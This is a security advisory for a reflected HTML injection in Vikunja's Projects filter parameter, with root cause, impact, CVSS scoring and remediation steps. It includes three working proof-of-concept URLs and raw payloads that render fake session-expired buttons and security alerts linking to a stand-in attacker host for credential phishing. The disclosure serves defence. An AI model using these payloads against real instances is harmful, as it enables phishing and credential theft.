# [M] Vikunja has Reflected HTML Injection via filter Parameter in its Projects Module

## Summary
Severity: Medium
Advisory: GHSA-4qgr-4h56-8895
CVE: CVE-2026-27116
CWE: CWE-116, CWE-79, CWE-80
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-02-25
Source: https://github.com/advisories/GHSA-4qgr-4h56-8895
Type: github-advisory

## Affected
- Go: `code.vikunja.io/api` — affected >=0

## Details
## Summary

[Vikunja](https://github.com/go-vikunja/vikunja) is an open-source self-hosted task management platform with 3,300+ GitHub stars. A reflected HTML injection vulnerability exists in the Projects module where the `filter` URL parameter is rendered into the DOM without output encoding when the user clicks "Filter." While `<script>` and `<iframe>` are blocked, `<svg>`, `<a>`, and formatting tags (`<h1>`, `<b>`, `<u>`) render without restriction — enabling SVG-based phishing buttons, external redirect links, and content spoofing within the trusted application origin.

**Attack flow:** Attacker shares a crafted project filter link (routine Vikunja workflow) → victim opens it → victim clicks "Filter" (standard UI action) → phishing content renders inside trusted Vikunja interface.

## Affected Component

| Field | Detail |
|---|---|
| Application | Vikunja v1.1.0 |
| Module | Projects |
| Endpoint | `/projects/-1/-1?filter=PAYLOAD&page=1` |
| Parameter | `filter` (GET) |
| Trigger | Click "Filter" button |
| Stack | Go backend, Vue.js + TypeScript frontend |
| Blocked | `<script>`, `<iframe>` |
| Allowed | `<svg>`, `<a>`, `<rect>`, `<text>`, `<h1>`, `<b>`, `<u>` |

## Proof-of-Concept

### PoC-1: SVG Phishing Button (Highest Impact)

Renders a styled, clickable red button redirecting to attacker domain. Visually indistinguishable from a real UI button.

```
http://localhost:3456/projects/-1/-1?filter=%3Csvg%20width%3D%22400%22%20height%3D%2260%22%3E%3Ca%20href%3D%22https%3A%2F%2Fattacker.example.com%2Flogin%22%3E%3Crect%20width%3D%22400%22%20height%3D%2260%22%20rx%3D%224%22%20fill%3D%22%23d32f2f%22%3E%3C%2Frect%3E%3Ctext%20x%3D%22200%22%20y%3D%2237%22%20text-anchor%3D%22middle%22%20fill%3D%22white%22%20font-size%3D%2216%22%3ESession%20Expired%20-%20Click%20to%20Re-authenticate%3C%2Ftext%3E%3C%2Fa%3E%3C%2Fsvg%3E&page=1
```

Raw payload:
```html
<svg width="400" height="60"><a href="https://attacker.example.com/login"><rect width="400" height="60" rx="4" fill="#d32f2f"></rect><text x="200" y="37" text-anchor="middle" fill="white" font-size="16">Session Expired - Click to Re-authenticate</text></a></svg>
```

### PoC-2: Phishing Link via Heading + Anchor

Prominent clickable link styled as urgent system message.

```
http://localhost:3456/projects/-1/-1?filter=%3Ch1%3E%3Ca%20href%3D%22https%3A%2F%2Fattacker.example.com%2Flogin%22%3E%E2%9A%A0%20Your%20session%20has%20expired.%20Click%20here%20to%20sign%20in%20again.%3C%2Fa%3E%3C%2Fh1%3E&page=1
```

Raw payload:
```html
<h1><a href="https://attacker.example.com/login">⚠ Your session has expired. Click here to sign in again.</a></h1>
```

### PoC-3: Content Spoofing — Fake Security Alert

Fake security warning directing victim to attacker-controlled contact.

```
http://localhost:3456/projects/-1/-1?filter=%3Ch1%3E%3Cu%3E%3Cb%3E%E2%9A%A0%20SECURITY%20ALERT%3C%2Fb%3E%3C%2Fu%3E%3C%2Fh1%3E%3Cb%3EUnauthorized%20access%20detected%20on%20your%20account.%20Your%20account%20will%20be%20suspended%20in%2024%20hours.%20Contact%20IT%20security%20immediately%20at%20security%40attacker.example.com%20or%20visit%20https%3A%2F%2Fattacker.example.com%2Fverify%20to%20confirm%20your%20identity.%3C%2Fb%3E&page=1
```

Raw payload:
```html
<h1><u><b>⚠ SECURITY ALERT</b></u></h1><b>Unauthorized access detected on your account. Your account will be suspended in 24 hours. Contact IT security immediately at security@attacker.example.com or visit https://attacker.example.com/verify to confirm your identity.</b>
```

## Root Cause

The `filter` parameter is inserted into the DOM as raw HTML — likely via Vue.js `v-html` or `innerHTML`. A partial denylist strips `<script>` and `<iframe>` but does not encode output or filter SVG/anchor/formatting elements. No allowlist, no output encoding, no input syntax validation exists.

## Impact

| Impact | Description |
|---|---|
| SVG Phishing Buttons | Pixel-perfect fake buttons redirect to credential harvesting pages |
| External Redirect | Anchor tags point to attacker domains from within trusted origin |
| Content Spoofing | Fake alerts manipulate users into contacting attacker channels |
| Self-Hosted Risk | Compromised credentials may grant access to internal infrastructure |
| API Access | Same credentials grant full REST API access for data exfiltration |
| No Logging | GET-based reflected injection leaves no distinguishable server logs |

**Not Self-XSS:** Payload is attacker-controlled via URL, delivered through routine link sharing, triggered by standard UI interaction. Victim performs no security-relevant decision.

## CWE & CVSS

**CWE-79** (Primary) — Improper Neutralization of Input During Web Page Generation

**CWE-80** (Secondary) — Improper Neutralization of Script-Related HTML Tags

**CVSS 3.1:** `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` — **6.1 (Medium)**

Score understates risk because: user interactions are routine workflow (not security decisions), SVG enables pixel-perfect UI spoofing, self-hosted deployments expose internal infrastructure, and API credential equivalence enables automated data exfiltration.

## Remediation

| Priority | Action |
|---|---|
| P0 | Replace `v-html` with `v-text` or `{{ }}` interpolation (auto-escapes HTML) |
| P0 | HTML entity encode the `filter` value at rendering point |
| P1 | Replace denylist with DOMPurify strict allowlist or eliminate HTML rendering of filter values |
| P1 | Deploy CSP with `form-action 'self'` |
| P2 | Server-side input validation — reject filter values not matching expected syntax |

## References

- Vikunja Repository: https://github.com/go-vikunja/vikunja
- CWE-79: https://cwe.mitre.org/data/definitions/79.html
- CWE-80: https://cwe.mitre.org/data/definitions/80.html
- OWASP XSS Prevention: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html

## Conclusion

The `filter` parameter in Vikunja's Projects module renders unsanitized HTML into the DOM, enabling SVG-based phishing buttons, external redirect links, and content spoofing within the trusted application origin. The attack requires only routine workflow actions — opening a shared link and clicking "Filter." The fix is a single-line change: replacing `v-html` with `v-text` in the Vue.js rendering logic. Given Vikunja's adoption (3,300+ stars), self-hosted deployment model, and API credential equivalence, this warrants prompt remediation.

<img width="1920" height="1020" alt="image" src="https://github.com/user-attachments/assets/007f9b1a-fd20-4fe8-84e5-1bf886a5a7a9" />

A fix is available at https://github.com/go-vikunja/vikunja/releases/tag/v2.0.0.

## References
- https://github.com/go-vikunja/vikunja/security/advisories/GHSA-4qgr-4h56-8895
- https://nvd.nist.gov/vuln/detail/CVE-2026-27116
- https://github.com/go-vikunja/vikunja/commit/a42b4f37bde58596a3b69482cd5a67641a94f62d
- https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html
- https://github.com/go-vikunja/vikunja
- https://github.com/go-vikunja/vikunja/releases/tag/v2.0.0
- https://vikunja.io/changelog/vikunja-v2.0.0-was-released
